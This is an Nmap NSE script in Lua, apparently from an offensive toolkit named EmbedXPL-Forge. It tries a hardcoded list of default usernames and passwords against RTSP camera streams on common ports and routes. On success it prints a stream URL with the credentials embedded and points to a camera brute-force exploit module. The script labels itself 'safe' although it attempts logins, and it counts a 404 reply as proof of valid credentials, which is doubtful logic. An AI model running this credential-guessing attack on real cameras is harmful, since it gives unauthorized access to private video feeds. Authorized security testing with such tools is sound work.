-- embedxpl-rtsp-creds.nse
-- EmbedXPL-Forge NSE Script — RTSP Default Credential Tester
--
-- Author : André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
-- Version: 1.0.0
-- License: BSD
--
-- DESCRIPTION:
--   Tests RTSP endpoints against common default credentials using RTSP DESCRIBE
--   with Basic authentication. On success, returns the valid credential pair,
--   the accessible stream URL, and the EmbedXPL-Forge exploit to run.
--
--   This script performs a quick sanity test (not a full brute-force).
--   For full brute-force, use EmbedXPL-Forge's RTSPAttacker engine:
--     embedxpl > use exploits/cameras/multi/rtsp_cameradar_attack
--
-- USAGE:
--   nmap -p 554,5554,8554 --script embedxpl-rtsp-creds <target>
--   nmap -p 554 --script embedxpl-rtsp-creds --script-args rtsp.route=/live.sdp <target>
--
-- OUTPUT EXAMPLE:
--   554/tcp open rtsp
--   | embedxpl-rtsp-creds:
--   |   Credential found: admin: (empty password)
--   |   Stream URL: rtsp://admin:@192.168.1.100:554/live.sdp
--   |   Auth type: Basic
--   |_  EmbedXPL: embedxpl > use exploits/cameras/multi/rtsp_cameradar_attack

local nmap   = require "nmap"
local stdnse = require "stdnse"
local comm   = require "comm"
local base64 = require "base64"
local string = require "string"

description = [[
Tests RTSP streams against a curated list of default camera credentials
(admin:admin, admin:(empty), root:root, etc.). Reports any successful
authentication and suggests EmbedXPL-Forge for complete exploitation.
]]

author     = "André Henrique (@mrhenrike) | União Geek"
license    = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = { "auth", "vuln", "safe" }

portrule = function(host, port)
  return port.protocol == "tcp" and (
    port.number == 554  or
    port.number == 5554 or
    port.number == 8554 or
    port.number == 10554
  )
end

-- Default credential pairs: {username, password}
local CREDENTIALS = {
  { "", "" },
  { "admin", "" },
  { "admin", "admin" },
  { "admin", "12345" },
  { "admin", "123456" },
  { "admin", "password" },
  { "admin", "Admin" },
  { "admin", "admin123" },
  { "root", "" },
  { "root", "root" },
  { "root", "admin" },
  { "root", "12345" },
  { "user", "" },
  { "guest", "" },
  { "supervisor", "supervisor" },
  { "admin", "hikadmin" },
  { "admin", "reolink" },
  { "admin", "tapo" },
}

-- Common RTSP routes to try
local ROUTES = {
  "",
  "live.sdp",
  "live",
  "stream1",
  "h264/ch1/main/av_stream",
  "cam/realmonitor?channel=1&subtype=0",
  "Streaming/Channels/1",
  "onvif1",
  "video1",
}

local function b64encode(s)
  local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  local result = ""
  local padding = ""
  s = tostring(s)
  for i = 1, #s, 3 do
    local n = (s:byte(i) or 0) * 0x10000 +
              (s:byte(i+1) or 0) * 0x100 +
              (s:byte(i+2) or 0)
    if not s:byte(i+1) then padding = "==" elseif not s:byte(i+2) then padding = "=" end
    result = result .. b:sub(math.floor(n/0x40000)+1, math.floor(n/0x40000)+1)
                     .. b:sub(math.floor((n%0x40000)/0x1000)+1, math.floor((n%0x40000)/0x1000)+1)
                     .. (s:byte(i+1) and b:sub(math.floor((n%0x1000)/0x40)+1, math.floor((n%0x1000)/0x40)+1) or "=")
                     .. (s:byte(i+2) and b:sub(n%0x40+1, n%0x40+1) or "=")
  end
  return result:sub(1, -(#padding+1)) .. padding
end

local function rtsp_describe(host, port, route, user, pass)
  local url  = ("rtsp://%s:%d/%s"):format(host.ip, port.number, route)
  local cred = b64encode(user .. ":" .. pass)
  local req  = ("DESCRIBE %s RTSP/1.0\r\n" ..
                "CSeq: 1\r\n" ..
                "User-Agent: EmbedXPL-NSE\r\n" ..
                "Accept: application/sdp\r\n" ..
                "Authorization: Basic %s\r\n" ..
                "\r\n"):format(url, cred)
  local status, data = comm.exchange(host, port, req, { proto="tcp", timeout=4000 })
  if not status or not data then return nil end
  local code = data:match("RTSP/1%.%d+%s+(%d+)")
  return code
end

action = function(host, port)
  local custom_route = stdnse.get_script_args("rtsp.route")
  local routes = custom_route and { custom_route } or ROUTES

  -- First probe: check if RTSP is alive (no auth)
  local req0 = ("OPTIONS rtsp://%s:%d/ RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: EmbedXPL-NSE\r\n\r\n"):format(
    host.ip, port.number
  )
  local ok, banner = comm.exchange(host, port, req0, { proto="tcp", timeout=4000 })
  if not ok or not banner then return nil end
  if not banner:match("RTSP/1") then return nil end

  local output   = stdnse.output_table()
  local server   = banner:match("Server:%s*([^\r\n]+)") or "(unknown)"
  output["Server"] = server

  -- Try routes × credentials
  for _, route in ipairs(routes) do
    for _, cred in ipairs(CREDENTIALS) do
      local user, pass = cred[1], cred[2]
      local code = rtsp_describe(host, port, route, user, pass)
      if code == "200" or code == "404" then
        -- 200 = full access; 404 = auth ok but route wrong (still valid creds)
        local url = ("rtsp://%s:%s@%s:%d/%s"):format(user, pass, host.ip, port.number, route)
        output["Credential found"]  = user .. ":" .. (pass ~= "" and pass or "(empty)")
        output["Stream URL"]        = url
        output["Auth type"]         = "Basic"
        output["Response code"]     = code
        output["EmbedXPL full scan"] = "exploits/cameras/multi/rtsp_cameradar_attack"
        output["Run exploit"] = "embedxpl > use exploits/cameras/multi/rtsp_cameradar_attack"
        return output
      end
    end
  end

  output["Result"] = "No default credentials matched"
  output["Full brute-force"] = "embedxpl > use exploits/cameras/multi/rtsp_cameradar_attack"
  return output
end
